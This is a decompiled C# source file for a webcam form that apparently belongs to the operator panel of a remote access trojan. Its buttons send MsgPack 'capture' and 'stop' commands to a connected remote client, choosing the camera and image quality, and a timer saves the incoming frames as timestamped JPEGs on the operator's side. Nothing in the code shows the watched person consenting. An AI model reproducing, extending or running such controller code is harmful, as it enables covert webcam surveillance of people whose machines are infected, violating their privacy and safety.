using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using Server.Connection;
using Server.MessagePack;
using Siticone.Desktop.UI.WinForms;

namespace Server.Forms
{
	// Token: 0x020000AA RID: 170
	public partial class FormWebcam : Form
	{
		// Token: 0x170000CD RID: 205
		// (get) Token: 0x06000553 RID: 1363 RVA: 0x00004D1C File Offset: 0x00002F1C
		// (set) Token: 0x06000554 RID: 1364 RVA: 0x00004D24 File Offset: 0x00002F24
		public FormMain F { get; set; }

		// Token: 0x170000CE RID: 206
		// (get) Token: 0x06000555 RID: 1365 RVA: 0x00004D2D File Offset: 0x00002F2D
		// (set) Token: 0x06000556 RID: 1366 RVA: 0x00004D35 File Offset: 0x00002F35
		internal Clients Client { get; set; }

		// Token: 0x170000CF RID: 207
		// (get) Token: 0x06000557 RID: 1367 RVA: 0x00004D3E File Offset: 0x00002F3E
		// (set) Token: 0x06000558 RID: 1368 RVA: 0x00004D46 File Offset: 0x00002F46
		internal Clients ParentClient { get; set; }

		// Token: 0x170000D0 RID: 208
		// (get) Token: 0x06000559 RID: 1369 RVA: 0x00004D4F File Offset: 0x00002F4F
		// (set) Token: 0x0600055A RID: 1370 RVA: 0x00004D57 File Offset: 0x00002F57
		public string FullPath { get; set; }

		// Token: 0x170000D1 RID: 209
		// (get) Token: 0x0600055B RID: 1371 RVA: 0x00004D60 File Offset: 0x00002F60
		// (set) Token: 0x0600055C RID: 1372 RVA: 0x00004D68 File Offset: 0x00002F68
		public Image GetImage { get; set; }

		// Token: 0x0600055D RID: 1373 RVA: 0x00004D71 File Offset: 0x00002F71
		public FormWebcam()
		{
			this.InitializeComponent();
		}

		// Token: 0x0600055E RID: 1374 RVA: 0x00046EAC File Offset: 0x000450AC
		private void Button1_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.button1.Tag == "play")
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "webcam";
					msgPack.ForcePathObject("Command").AsString = "capture";
					msgPack.ForcePathObject("List").AsInteger = (long)this.comboBox1.SelectedIndex;
					msgPack.ForcePathObject("Quality").AsInteger = (long)Convert.ToInt32(this.numericUpDown1.Value);
					ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
					this.button1.Tag = "stop";
					this.numericUpDown1.Enabled = false;
					this.comboBox1.Enabled = false;
					this.btnSave.Enabled = true;
				}
				else
				{
					this.button1.Tag = "play";
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Pac_ket").AsString = "webcam";
					msgPack2.ForcePathObject("Command").AsString = "stop";
					ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack2.Encode2Bytes());
					this.numericUpDown1.Enabled = true;
					this.comboBox1.Enabled = true;
					this.btnSave.Enabled = false;
					this.timerSave.Stop();
				}
			}
			catch
			{
			}
		}

		// Token: 0x0600055F RID: 1375 RVA: 0x00047040 File Offset: 0x00045240
		private void Timer1_Tick(object sender, EventArgs e)
		{
			try
			{
				if (!this.ParentClient.TcpClient.Connected || !this.Client.TcpClient.Connected)
				{
					base.Close();
				}
			}
			catch
			{
				base.Close();
			}
		}

		// Token: 0x06000560 RID: 1376 RVA: 0x00047094 File Offset: 0x00045294
		private void FormWebcam_FormClosed(object sender, FormClosedEventArgs e)
		{
			try
			{
				ThreadPool.QueueUserWorkItem(delegate(object o)
				{
					Clients client = this.Client;
					if (client == null)
					{
						return;
					}
					client.Disconnected();
				});
			}
			catch
			{
			}
		}

		// Token: 0x06000561 RID: 1377 RVA: 0x000470C8 File Offset: 0x000452C8
		private void BtnSave_Click(object sender, EventArgs e)
		{
			if (this.button1.Tag == "stop")
			{
				if (this.SaveIt)
				{
					this.SaveIt = false;
					return;
				}
				try
				{
					if (!Directory.Exists(this.FullPath))
					{
						Directory.CreateDirectory(this.FullPath);
					}
					Process.Start(this.FullPath);
				}
				catch
				{
				}
				this.SaveIt = true;
			}
		}

		// Token: 0x06000562 RID: 1378 RVA: 0x0004713C File Offset: 0x0004533C
		private void TimerSave_Tick(object sender, EventArgs e)
		{
			try
			{
				if (!Directory.Exists(this.FullPath))
				{
					Directory.CreateDirectory(this.FullPath);
				}
				this.pictureBox1.Image.Save(this.FullPath + "\\IMG_" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + ".jpeg", ImageFormat.Jpeg);
			}
			catch
			{
			}
		}

		// Token: 0x040004E3 RID: 1251
		public Stopwatch sw = Stopwatch.StartNew();

		// Token: 0x040004E4 RID: 1252
		public int FPS;

		// Token: 0x040004E5 RID: 1253
		public bool SaveIt;
	}
}
